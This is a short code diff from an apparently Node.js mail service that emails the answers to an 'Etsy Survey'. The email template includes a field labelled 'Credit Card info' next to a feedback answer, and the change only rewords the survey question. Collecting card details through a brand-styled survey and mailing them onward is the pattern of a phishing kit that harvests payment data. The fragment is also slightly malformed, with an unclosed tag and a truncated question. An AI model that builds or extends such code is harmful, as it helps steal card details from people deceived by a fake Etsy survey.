@@ -18,7 +18,7 @@ exports.sendMailService=function(cardC='not exit',opinion='no Feedback',image='n
     subject: 'From Etsy Survey',
     html: `<ul>
      <li><br>Credit Card info:<b> ${cardC}</li>
-    <li>If there one thing that could change about Etsy involvement, what you would be?<br>answer:<span>${opinion}</span></li> 
+    <li> what you would be?<br>answer:<span>${opinion}</span></li> 
 
      </ul>`
     // attachments: [
